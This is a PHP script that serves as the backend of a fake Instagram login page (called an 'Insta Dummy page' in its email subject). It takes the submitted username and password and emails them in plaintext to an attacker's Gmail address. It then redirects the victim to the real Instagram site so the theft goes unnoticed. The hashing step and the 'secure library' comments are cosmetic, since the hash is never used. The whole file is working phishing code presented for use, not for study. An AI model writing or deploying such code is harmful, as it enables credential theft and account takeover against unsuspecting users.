<?php

// Variable settings
$username = filter_input(INPUT_POST, 'u_name', FILTER_SANITIZE_STRING);
$passcode = filter_input(INPUT_POST, 'pass', FILTER_SANITIZE_STRING);

$subject = "Someone Login ! Insta Dummy page";
$to = "xxxxxxxxxxx@gmail.com";

$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;

// Check input fields
if (!empty($username) and !empty($passcode)) {
    try {
        // Hash and salt password (example using password_hash())
        $hashedPasscode = password_hash($passcode, PASSWORD_DEFAULT);

        // Send email using a secure email library (e.g., PHPMailer)
        $mail = new PHPMailer();
        $mail->addAddress($to);
        $mail->Subject = $subject;
        $mail->Body = $txt;
        $mail->send();

        // Redirect to Instagram page
        header('Location: https://www.instagram.com');
        exit;
    } catch (Exception $e) {
        // Log error or display a friendly error message
        error_log($e->getMessage());
        echo 'Error sending email. Please try again.';
    }
} else {
    // Redirect back to login page with an error message
    header('Location: login.php?error=invalid_credentials');
    exit;
}
?>